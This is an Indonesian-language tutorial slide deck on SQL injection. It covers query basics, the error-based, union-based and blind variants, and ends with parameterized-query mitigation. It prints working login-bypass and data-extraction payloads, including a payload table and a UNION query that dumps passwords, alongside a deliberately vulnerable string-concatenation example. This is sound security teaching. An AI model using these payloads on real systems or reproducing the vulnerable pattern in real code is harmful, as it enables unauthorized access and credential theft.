üìä BAGIAN 1

Database & SQL

Fondasi untuk memahami SQL Injection

üèõÔ∏è Apa itu Database?

üìö

Bayangkan Perpustakaan Besar

Perpustakaan:

  • Ribuan buku tersusun di rak
  • Ada katalog untuk mencari
  • Dikelompokkan per kategori

Database:

  • Jutaan data tersimpan di server
  • Ada SQL untuk mencari
  • Dikelompokkan per tabel

üìã Struktur Database

Database menyimpan data dalam bentuk TABEL

Tabel: pengguna

id username password email
1 admin secret123 admin@web.com
2 budi budi456 budi@web.com
3 siti siti789 siti@web.com

Setiap baris = satu record data, Setiap kolom = satu jenis informasi

üí¨ Apa itu SQL?

SQL = Structured Query Language

Bahasa untuk "berbicara" dengan database

üó£Ô∏è Analogi:

Jika database adalah pelayan restoran,
maka SQL adalah bahasa untuk memesan makanan

‚å®Ô∏è Perintah SQL Dasar

SELECT - Mengambil data

SELECT * FROM pengguna

"Ambilkan semua data pengguna"

INSERT - Menambah data

INSERT INTO pengguna VALUES (...)

"Tambahkan pengguna baru"

UPDATE - Mengubah data

UPDATE pengguna SET ...

"Ubah data pengguna"

DELETE - Menghapus data

DELETE FROM pengguna

"Hapus data pengguna"

üîç Kondisi WHERE

WHERE digunakan untuk memfilter data yang diambil

-- Ambil SEMUA pengguna

SELECT * FROM pengguna


-- Ambil pengguna dengan username 'admin'

SELECT * FROM pengguna WHERE username = 'admin'


-- Cek login: username DAN password harus cocok

SELECT * FROM pengguna

WHERE username = 'admin' AND password = 'secret123'

üí≠ Komentar dalam SQL

Komentar adalah teks yang DIABAIKAN oleh database

-- Ini komentar satu baris (diabaikan)

SELECT * FROM pengguna -- sisanya diabaikan


/* Ini komentar

multi baris */

‚ö†Ô∏è Penting!

Tanda komentar (--) akan digunakan dalam serangan SQL Injection untuk menonaktifkan bagian query!

üíâ BAGIAN 2

Konsep SQL Injection

Memahami bagaimana serangan ini bekerja

‚ùì Apa itu SQL Injection?

üíâ

SQL Injection adalah teknik serangan yang
menyisipkan kode SQL berbahaya
ke dalam input aplikasi

üé≠ Analogi Sederhana:

Seperti mengisi formulir lamaran kerja dengan perintah:
"Nama: Ahmad; TERIMA SAYA SEBAGAI DIREKTUR"

ü§î Mengapa SQL Injection Terjadi?

Karena aplikasi menggabungkan input pengguna langsung ke query SQL

// Kode aplikasi (BERBAHAYA!)

query = "SELECT * FROM pengguna WHERE username='"

+ input_user

+ "' AND password='"

+ input_password

+ "'"

Jika pengguna memasukkan input normal: admin

Query menjadi: WHERE username='admin' AND password='xxx' ‚úÖ

‚ö° Ketika Serangan Terjadi

Penyerang memasukkan input berbahaya:

Username: admin'--

Password: apapun

Query yang terbentuk:

SELECT * FROM pengguna

WHERE username='admin'--' AND password='apapun'

Bagian setelah -- menjadi komentar dan DIABAIKAN!

‚öîÔ∏è Normal vs Serangan

‚úÖ NORMAL

Input:

User: admin

Pass: secret123

Query:

WHERE user='admin' AND pass='secret123'

Hasil: 1 user (jika cocok)

‚ö†Ô∏è SERANGAN

Input:

User: admin'--

Pass: apapun

Query:

WHERE user='admin'--..diabaikan..

Hasil: Login tanpa password!

üìö BAGIAN 3

Tipe-Tipe SQL Injection

Berbagai teknik yang digunakan penyerang

üóÇÔ∏è Klasifikasi SQL Injection

Tipe Cara Kerja Kesulitan
In-Band Hasil langsung terlihat di halaman ‚≠ê Mudah
Blind Hasil tidak terlihat, harus "menebak" ‚≠ê‚≠ê Sedang
Out-of-Band Data dikirim ke server lain ‚≠ê‚≠ê‚≠ê Sulit

üî¥ In-Band: Error-Based

Memanfaatkan pesan error untuk mendapatkan informasi

-- Payload yang menyebabkan error

Input: ' AND 1=CONVERT(int, @@version)--

‚ùå Pesan Error:

Conversion failed when converting 'Microsoft SQL Server 2019' to int

‚úì Penyerang tahu versi database!

üü† In-Band: Union-Based

Menggunakan UNION untuk menggabungkan hasil query

-- Query asli untuk menampilkan produk

SELECT nama, harga FROM produk WHERE id = 1


-- Payload penyerang

SELECT nama, harga FROM produk WHERE id = 1

UNION SELECT username, password FROM pengguna--

Hasil di halaman:

NamaHarga
Laptop Gaming15000000
adminsecret123
budibudi456

üü° Blind: Boolean-Based

Mengamati perbedaan respons untuk TRUE/FALSE

Jika TRUE

id=1 AND 1=1

Halaman: "Produk ditemukan"

Jika FALSE

id=1 AND 1=2

Halaman: "Tidak ditemukan"

üí° Teknik Ekstraksi:

id=1 AND SUBSTRING(password,1,1)='a'

Jika halaman normal ‚Üí karakter pertama password adalah 'a'

üü£ Blind: Time-Based

Mengukur waktu respons untuk menentukan TRUE/FALSE

-- Jika karakter pertama = 'a', tunggu 5 detik

id=1; IF(SUBSTRING(password,1,1)='a')

WAITFOR DELAY '0:0:5'

‚è±Ô∏è 5 detik delay

= Kondisi TRUE

Karakter = 'a' ‚úì

‚ö° Respons cepat

= Kondisi FALSE

Karakter ‚â† 'a' ‚úó

üìä Perbandingan Tipe SQLi

Aspek In-Band Blind
Hasil terlihat? Ya, langsung Tidak
Kecepatan Cepat Lambat (per karakter)
Jumlah request Sedikit Ratusan - ribuan
Deteksi Lebih mudah Lebih sulit
Bahaya Tinggi Tinggi (sama)

üîì BAGIAN 4

Teknik Bypass Authentication

Cara penyerang melewati halaman login

üîê Proses Login Normal

1
User memasukkan username & password
2
Aplikasi membuat query SQL untuk verifikasi
3
Database mengecek apakah data cocok
4
Jika cocok ‚Üí Login berhasil

-- Query login normal

SELECT * FROM users

WHERE username='admin' AND password='secret'

üíâ Payload Bypass #1: Komentar

Input:

Username: admin'--

Password: apapun (tidak penting)

-- Query yang terbentuk

SELECT * FROM users

WHERE username='admin'--' AND password='apapun'

‚úÖ Hasil: Login sebagai admin TANPA password!

Karena pengecekan password dijadikan komentar

üíâ Payload Bypass #2: OR TRUE

Input:

Username: ' OR '1'='1

Password: ' OR '1'='1

-- Query yang terbentuk

SELECT * FROM users

WHERE username='' OR '1'='1'

AND password='' OR '1'='1'

üí° Karena '1'='1' selalu TRUE,

Query mengembalikan SEMUA user dalam database!

üìã Payload Bypass Umum

Payload Fungsi
' OR '1'='1 Kondisi selalu TRUE
admin'-- Nonaktifkan cek password
' OR 1=1# Variasi untuk MySQL
') OR ('1'='1 Untuk query dengan kurung
' OR ''=' Kondisi string kosong
admin'/* Komentar multi-baris

Strategi Mitigasi

Cara mencegah SQL Injection

‚≠ê Solusi #1: Parameterized Query

Metode PALING EFEKTIF mencegah SQL Injection

‚ùå RENTAN

query = "SELECT * FROM users

WHERE user='" + input + "'"

Input digabung langsung

‚úÖ AMAN

stmt = "SELECT * FROM users

WHERE user = ?"

execute(stmt, [input])

Input terpisah dari query

üîÑ Cara Kerja Parameterized Query

1
Kompilasi Query
Database memproses struktur query terlebih dahulu
2
Binding Parameter
Input user dimasukkan sebagai DATA, bukan kode
3
Eksekusi Aman
Karakter khusus otomatis di-escape

üí° Kunci: Input ' OR '1'='1 menjadi:

WHERE user = '\' OR \'1\'=\'1'

Database mencari user dengan nama literal tersebut (tidak ditemukan)
